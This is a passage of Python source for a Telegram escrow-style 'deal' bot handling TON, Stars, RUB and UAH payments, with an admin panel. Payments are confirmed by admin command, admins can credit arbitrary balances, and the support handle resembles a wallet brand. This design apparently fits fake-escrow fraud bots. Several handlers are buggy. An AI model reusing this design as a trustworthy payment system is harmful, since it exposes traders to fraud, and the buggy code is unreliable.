        "seller_username": message.from_user.username,
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None,
        "buyer_message_id": None,
        "buyer_chat_id": None
    }
    save_deals(deals)

    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    await message.answer(
        f"{pm('✅')} СДЕЛКА #{deal_id} СОЗДАНА!\n\n"
        f"{pm('💰')} Сумма: {data['amount']} {data['currency']}\n"
        f"{pm('📦')} Товар: {data['product']}\n"
        f"{pm('👤')} Покупатель: @{buyer_username}\n\n"
        f"{pm('🔗')} ОТПРАВЬТЕ ЭТУ ССЫЛКУ ПОКУПАТЕЛЮ (ПРОСТО СКОПИРУЙТЕ ИЛИ ПЕРЕШЛИТЕ):\n\n"
        f"{deal_link}\n\n"
        f"{pm('🔥')} ПОСЛЕ ТОГО КАК ПОКУПАТЕЛЬ ОПЛАТИТ, ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ.",
        reply_markup=back_to_main_button()
    )

    await log_to_master(
        f"🆕 СОЗДАНА СДЕЛКА\n"
        f"ID: #{deal_id}\n"
        f"Продавец: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Покупатель: @{buyer_username}\n"
        f"Сумма: {data['amount']} {data['currency']}\n"
        f"Товар: {data['product']}"
    )
    await state.clear()


# ========== ОПЛАТА ==========
@dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
async def pay_by_rekvisits(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} СДЕЛКА НЕ НАЙДЕНА")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"{pm('❌')} СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
        return

    pay_text = get_rekvisits_text(deal["currency"], deal["amount"])

    text = f"{pm('✈️')} СДЕЛКА #{deal_id}\n\n" \
           f"{pm('📦')} Товар: {deal['product']}\n" \
           f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n" \
           f"{pm('👤')} Продавец: @{deal['seller_username']}\n\n" \
           f"{pm('💳')} РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ:\n{pay_text}\n\n" \
           f"{pm('🔥')} ПОСЛЕ ОПЛАТЫ АДМИНИСТРАТОР ПРОВЕРИТ ПЛАТЁЖ КОМАНДОЙ /pay {deal_id} {pm('🔥')}"
    await safe_edit(callback, text)


@dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
async def pay_by_balance(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} СДЕЛКА НЕ НАЙДЕНА")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await callback.answer(f"{pm('❌')} СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
        return

    buyer_balance = get_balance(callback.from_user.id)
    curr_key = deal["currency"].lower()

    if buyer_balance.get(curr_key, 0) < deal["amount"]:
        await callback.answer(
            f"{pm('❌')} НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ!\nНУЖНО: {deal['amount']} {deal['currency']}\nДОСТУПНО: {buyer_balance.get(curr_key, 0)}",
            show_alert=True)
        return

    buyer_balance[curr_key] -= deal["amount"]
    save_balance(balance)

    deal["status"] = "paid"
    deal["paid_by_admin"] = callback.from_user.id
    save_deals(deals)

    text = f"{pm('✅')} ОПЛАТА ПОДТВЕРЖДЕНА!\n\n" \
           f"СДЕЛКА #{deal_id}\n" \
           f"{pm('💰')} СПИСАНО С БАЛАНСА: {deal['amount']} {deal['currency']}\n\n" \
           f"{pm('🔔')} ПРОДАВЕЦ ПОЛУЧИТ УВЕДОМЛЕНИЕ ДЛЯ ПЕРЕДАЧИ ТОВАРА."
    await safe_edit(callback, text, reply_markup=back_to_main_button())

    await send_buyer_pending_message(deal_id)

    await bot.send_message(
        deal["seller_id"],
        f"{pm('💎')} СДЕЛКА #{deal_id} ОПЛАЧЕНА! {pm('💎')}\n\n"
        f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n"
        f"{pm('📦')} Товар: {deal['product']}\n"
        f"{pm('👤')} Покупатель: @{deal['buyer_username']}\n\n"
        f"{pm('⬇️')} НАЖМИТЕ КНОПКУ, КОГДА ПЕРЕДАДИТЕ ТОВАР {pm('⬇️')}",
        reply_markup=seller_confirm_keyboard(deal_id)
    )

    await log_to_master(f"💰 Сделка #{deal_id} оплачена с баланса @{callback.from_user.username}")


@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} НЕДОСТАТОЧНО ПРАВ")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"{pm('❗️')} ИСПОЛЬЗОВАНИЕ: /pay [ID СДЕЛКИ]\nПРИМЕР: /pay a3f2b1c4")
        return

    deal_id = args[1]
    if deal_id not in deals:
        await message.answer(f"{pm('❌')} СДЕЛКА С ID {deal_id} НЕ НАЙДЕНА")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"{pm('❌')} СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
        return

    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_deals(deals)

    await message.answer(f"{pm('✅')} ОПЛАТА ПОДТВЕРЖДЕНА ДЛЯ СДЕЛКИ {deal_id}")

    await send_buyer_pending_message(deal_id)

    await bot.send_message(
        deal["seller_id"],
        f"{pm('💎')} СДЕЛКА #{deal_id} ОПЛАЧЕНА! {pm('💎')}\n\n"
        f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n"
        f"{pm('📦')} Товар: {deal['product']}\n"
        f"{pm('👤')} Покупатель: @{deal['buyer_username']}\n\n"
        f"{pm('⬇️')} НАЖМИТЕ КНОПКУ, КОГДА ПЕРЕДАДИТЕ ТОВАР {pm('⬇️')}",
        reply_markup=seller_confirm_keyboard(deal_id)
    )

    await log_to_master(
        f"💸 ОПЛАТА ПОДТВЕРЖДЕНА\n"
        f"Сделка: #{deal_id}\n"
        f"Админ: {message.from_user.full_name} (@{message.from_user.username})\n"
        f"Продавец: @{deal['seller_username']}\n"
        f"Сумма: {deal['amount']} {deal['currency']}"
    )


@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_delivered(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[-1]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} СДЕЛКА НЕ НАЙДЕНА")
        return

    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer(f"{pm('❌')} ОПЛАТА ЕЩЁ НЕ ПОДТВЕРЖДЕНА")
        return

    deal["status"] = "awaiting_confirmation"
    save_deals(deals)

    text = f"{pm('✅')} ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА!\n\n" \
           f"{pm('📦')} Товар: {deal['product']}\n" \
           f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n" \
           f"{pm('👤')} Покупатель: @{deal['buyer_username']}\n\n" \
           f"{pm('⏳')} ОЖИДАЕМ ПОДТВЕРЖДЕНИЯ ОТ ПОКУПАТЕЛЯ..."
    await safe_edit(callback, text)

    active_keyboard = buyer_confirm_keyboard(deal_id)
    updated = False

    if deal.get("buyer_message_id") and deal.get("buyer_chat_id"):
        try:
            await bot.edit_message_reply_markup(
                chat_id=deal["buyer_chat_id"],
                message_id=deal["buyer_message_id"],
                reply_markup=active_keyboard
            )
            updated = True
        except Exception as e:
            print(f"Не удалось обновить клавиатуру: {e}")

    if not updated:
        try:
            await bot.send_message(
                deal["buyer_username"],
                f"{pm('📦')} ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР ПО СДЕЛКЕ #{deal_id}!\n\n"
                f"{pm('📦')} Товар: {deal['product']}\n"
                f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n"
                f"{pm('👤')} Продавец: @{deal['seller_username']}\n\n"
                f"{pm('👍')} ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
                reply_markup=active_keyboard
            )
        except:
            if deal.get("buyer_id"):
                try:
                    await bot.send_message(
                        deal["buyer_id"],
                        f"{pm('📦')} ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР ПО СДЕЛКЕ #{deal_id}!\n\n"
                        f"{pm('📦')} Товар: {deal['product']}\n"
                        f"{pm('💰')} Сумма: {deal['amount']} {deal['currency']}\n"
                        f"{pm('👤')} Продавец: @{deal['seller_username']}\n\n"
                        f"{pm('👍')} ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
                        reply_markup=active_keyboard
                    )
                except Exception as e:
                    await callback.message.answer(
                        f"{pm('❗️')} НЕ УДАЛОСЬ УВЕДОМИТЬ ПОКУПАТЕЛЯ @{deal['buyer_username']}\n\n"
                        f"Отправьте ему эту ссылку:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                    )

    await callback.answer(f"{pm('✅')} Продавец подтвердил передачу товара")


@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm_receipt(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"{pm('❌')} СДЕЛКА НЕ НАЙДЕНА")
        return

    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer(f"{pm('❌')} ПРОДАВЕЦ ЕЩЁ НЕ ПОДТВЕРДИЛ ПЕРЕДАЧУ ТОВАРА")
        return

    add_balance(deal["seller_id"], deal["currency"], deal["amount"])

    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_deals(deals)

    text = f"{pm('✅')} ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА!\n\n" \
           f"СДЕЛКА #{deal_id} ЗАВЕРШЕНА.\n" \
           f"{pm('🤝')} СПАСИБО ЗА ДОВЕРИЕ!"
    await safe_edit(callback, text, reply_markup=back_to_main_button())

    await bot.send_message(
        deal["seller_id"],
        f"{pm('🎁')} СДЕЛКА #{deal_id} УСПЕШНО ЗАВЕРШЕНА! {pm('🎁')}\n\n"
        f"{pm('💰')} {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА ВАШ БАЛАНС.\n"
        f"{pm('📦')} Товар: {deal['product']}\n"
        f"{pm('👤')} Покупатель: @{deal['buyer_username']}\n\n"
        f"{pm('📊')} БАЛАНС МОЖНО ПРОВЕРИТЬ В ГЛАВНОМ МЕНЮ."
    )

    await log_to_master(
        f"🎉 СДЕЛКА ЗАВЕРШЕНА\n"
        f"ID: #{deal_id}\n"
        f"Продавец: @{deal['seller_username']} (+{deal['amount']} {deal['currency']})\n"
        f"Покупатель: @{deal['buyer_username']}"
    )


# ========== АДМИН-ПАНЕЛЬ ==========
@dp.callback_query(lambda c: c.data == "withdraw_requests")
async def show_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return

    pending = {rid: req for rid, req in withdraw_requests.items() if req["status"] == "pending"}

    if not pending:
        text = f"{pm('📭')} НЕТ АКТИВНЫХ ЗАЯВОК НА ВЫВОД"
        await safe_edit(callback, text, reply_markup=back_to_main_button())
    else:
        text = f"{pm('💲')} ЗАЯВКИ НА ВЫВОД\n\n"
        for rid, req in pending.items():
            text += f"#{rid} | {req['amount']} {req['currency']} | @{req['username']}\n"
            text += f"📝 {req['details'][:50]}\n"
            text += f"➡️ /confirm_withdraw {rid}\n\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button())


@dp.callback_query(lambda c: c.data == "change_photo")
async def change_photo_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('📷')} ОТПРАВЬТЕ НОВОЕ ФОТО ДЛЯ ПРИВЕТСТВЕННОГО СООБЩЕНИЯ.\n\nФОТО ДОЛЖНО БЫТЬ В ФОРМАТЕ JPEG ИЛИ PNG."
    await safe_edit(callback, text)
    await state.set_state(PhotoStates.waiting_for_photo)


@dp.message(PhotoStates.waiting_for_photo)
async def save_photo_handler(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН")
        await state.clear()
        return

    if message.photo:
        file_id = message.photo[-1].file_id
        start_photo["file_id"] = file_id
        save_start_photo(start_photo)
        await message.answer(f"{pm('✅')} ФОТО ДЛЯ ПРИВЕТСТВЕННОГО СООБЩЕНИЯ ОБНОВЛЕНО!",
                             reply_markup=back_to_main_button())
        await log_to_master(f"🖼 Админ {message.from_user.full_name} изменил фото при старте")
    else:
        await message.answer(f"{pm('❌')} ОТПРАВЬТЕ ФОТО, А НЕ ДРУГОЙ ФАЙЛ")

    await state.clear()


@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    await state.set_state(AdminAddBalanceState.waiting_for_user_id)
    text = f"{pm('💰')} ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ, КОТОРОМУ ХОТИТЕ НАЧИСЛИТЬ БАЛАНС:\n\nЧТОБЫ УЗНАТЬ ID, МОЖНО ИСПОЛЬЗОВАТЬ БОТА @userinfobot"
    await safe_edit(callback, text)


@dp.message(AdminAddBalanceState.waiting_for_user_id)
async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await state.set_state(AdminAddBalanceState.waiting_for_currency)
        await message.answer(f"{pm('💎')} ВЫБЕРИТЕ ВАЛЮТУ:",
                             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                 [premium_button("TON", "admin_balance_TON", "💎")],
                                 [premium_button("STARS", "admin_balance_STARS", "⭐️")],
                                 [premium_button("RUB", "admin_balance_RUB", "💰")],
                                 [premium_button("UAH", "admin_balance_UAH", "🌐")]
                             ]))
    except ValueError:
        await message.answer(f"{pm('❌')} ВВЕДИТЕ ЧИСЛОВОЙ ID ПОЛЬЗОВАТЕЛЯ")


@dp.callback_query(lambda c: c.data.startswith("admin_balance_"))
async def admin_add_balance_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    await state.update_data(target_currency=currency)
    await state.set_state(AdminAddBalanceState.waiting_for_amount)
    text = f"{pm('💰')} ВВЕДИТЕ СУММУ ДЛЯ НАЧИСЛЕНИЯ В {currency}:"
    await safe_edit(callback, text)


@dp.message(AdminAddBalanceState.waiting_for_amount)
async def admin_add_balance_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data["target_user_id"]
        currency = data["target_currency"]

        add_balance(user_id, currency, amount)

        await message.answer(f"{pm('✅')} НАЧИСЛЕНО {amount} {currency} ПОЛЬЗОВАТЕЛЮ (ID: {user_id})",
                             reply_markup=back_to_main_button())
        await log_to_master(
            f"💰 Админ @{message.from_user.username} начислил {amount} {currency} пользователю ID:{user_id}")

        try:
            await bot.send_message(
                user_id,
                f"{pm('💰')} ВАШ БАЛАНС ПОПОЛНЕН!\n\n"
                f"СУММА: {amount} {currency}\n\n"
                f"ПРОВЕРИТЬ БАЛАНС: ГЛАВНОЕ МЕНЮ → МОЙ БАЛАНС"
            )
        except:
            pass

        await state.clear()
    except:
        await message.answer(f"{pm('❌')} ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО")


@dp.callback_query(lambda c: c.data == "edit_rekvisits")
async def edit_rekvisits_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('💳')} РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ ОПЛАТЫ\n\nВЫБЕРИТЕ ВАЛЮТУ ДЛЯ ИЗМЕНЕНИЯ:"
    await safe_edit(callback, text, reply_markup=rekvisits_edit_keyboard())


@dp.callback_query(lambda c: c.data == "edit_ton")
async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('✏️')} ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ TON:\n\nИСПОЛЬЗУЙТЕ {{amount}} ДЛЯ ПОДСТАНОВКИ СУММЫ"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="ton")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_stars")
async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('✏️')} ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ STARS:\n\nИСПОЛЬЗУЙТЕ {{amount}} ДЛЯ ПОДСТАНОВКИ СУММЫ"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="stars")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_rub")
async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('✏️')} ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ RUB:\n\nИСПОЛЬЗУЙТЕ {{amount}} ДЛЯ ПОДСТАНОВКИ СУММЫ"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="rub")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_uah")
async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('✏️')} ВВЕДИТЕ НОВЫЙ ТЕКСТ ДЛЯ ОПЛАТЫ UAH:\n\nИСПОЛЬЗУЙТЕ {{amount}} ДЛЯ ПОДСТАНОВКИ СУММЫ"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="uah")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.message(RekvStates.waiting_for_rekv_text)
async def save_rekv_text(message: types.Message, state: FSMContext):
    data = await state.get_data()
    rekv_type = data.get("rekv_type")
    if rekv_type:
        rekvisits[rekv_type] = message.text.strip()
        save_rekvisits(rekvisits)
        await message.answer(f"{pm('✅')} РЕКВИЗИТЫ ДЛЯ {rekv_type.upper()} ОБНОВЛЕНЫ!",
                             reply_markup=back_to_main_button())
        await log_to_master(f"💳 Админ {message.from_user.full_name} изменил реквизиты для {rekv_type.upper()}")
    await state.clear()


@dp.callback_query(lambda c: c.data == "back_to_admin")
async def back_to_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    text = f"{pm('👑')} ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:"
    await safe_edit(callback, text, reply_markup=admin_panel_keyboard())


@dp.callback_query(lambda c: c.data == "add_admin")
async def add_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer(f"{pm('❌')} ТОЛЬКО ГЛАВНЫЙ АДМИН", show_alert=True)
        return
    text = f"{pm('📝')} ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ ДЛЯ ДОБАВЛЕНИЯ В АДМИНЫ:"
    await safe_edit(callback, text)


@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def add_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    admins.add(user_id)
    save_admins(admins)
    await message.answer(f"{pm('✅')} ПОЛЬЗОВАТЕЛЬ {user_id} ТЕПЕРЬ АДМИНИСТРАТОР!", reply_markup=back_to_main_button())
    await log_to_master(f"👑 Новый админ добавлен: {user_id}")


@dp.callback_query(lambda c: c.data == "remove_admin")
async def remove_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer(f"{pm('❌')} ТОЛЬКО ГЛАВНЫЙ АДМИН", show_alert=True)
        return
    text = f"{pm('📝')} ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ ДЛЯ УДАЛЕНИЯ ИЗ АДМИНОВ:"
    await safe_edit(callback, text)


@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def remove_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    if user_id == MASTER_ADMIN_ID:
        await message.answer(f"{pm('❌')} НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА")
        return
    if user_id in admins:
        admins.remove(user_id)
        save_admins(admins)
        await message.answer(f"{pm('✅')} ПОЛЬЗОВАТЕЛЬ {user_id} БОЛЬШЕ НЕ АДМИНИСТРАТОР.",
                             reply_markup=back_to_main_button())
        await log_to_master(f"👑 Админ удалён: {user_id}")
    else:
        await message.answer(f"{pm('❌')} НЕ НАЙДЕН")


@dp.callback_query(lambda c: c.data == "list_admins")
async def list_admins_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in admins])
    text = f"{pm('📊')} СПИСОК АДМИНОВ:\n\n{admin_list}"
    await safe_edit(callback, text, reply_markup=back_to_main_button())


@dp.callback_query(lambda c: c.data == "all_deals")
async def all_deals_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ДОСТУП ЗАПРЕЩЁН", show_alert=True)
        return
    if not deals:
        text = f"{pm('📭')} НЕТ СДЕЛОК"
        await safe_edit(callback, text, reply_markup=back_to_main_button())
    else:
        text = f"{pm('📊')} ВСЕ СДЕЛКИ\n\n"
        for deal_id, deal in list(deals.items())[-20:]:
            status_emoji = {"waiting_payment": pm('⏳'), "paid": pm('✅'), "awaiting_confirmation": pm('📦'),
                            "completed": pm('🎁')}.get(deal['status'], pm('❓'))
            text += f"{deal_id} | {status_emoji} | {deal['amount']} {deal['currency']}\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button())


@dp.callback_query(lambda c: c.data == "noop")
async def noop_callback(callback: types.CallbackQuery):
    await callback.answer(f"{pm('⏳')} ДОЖДИТЕСЬ, КОГДА ПРОДАВЕЦ ПЕРЕДАСТ ТОВАР")


@dp.callback_query(lambda c: c.data.startswith("support_"))
async def support_callback(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[1]
    await callback.answer()
    await callback.message.answer(
        f"{pm('💬')} ПО ВОПРОСАМ СДЕЛКИ #{deal_id} ОБРАЩАЙТЕСЬ В ПОДДЕРЖКУ:\n@tonkeeperdealssupbot"
    )


# ========== ЗАПУСК ==========
async def main():
    print(f"{pm('🚀')} {BOT_NAME} ЗАПУЩЕН")
    print(f"{pm('👑')} ГЛАВНЫЙ АДМИН: {MASTER_ADMIN_ID}")
    print(f"{pm('📊')} ВСЕГО АДМИНОВ: {len(admins)}")
    print(f"{pm('🤖')} БОТ: @{BOT_USERNAME}")
    print(f"{pm('💎')} ДОСТУПНЫЕ ВАЛЮТЫ: TON, STARS, RUB, UAH")
    print(f"{pm('✅')} ПРЕМИУМ ЭМОДЗИ ЗАГРУЖЕНЫ")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
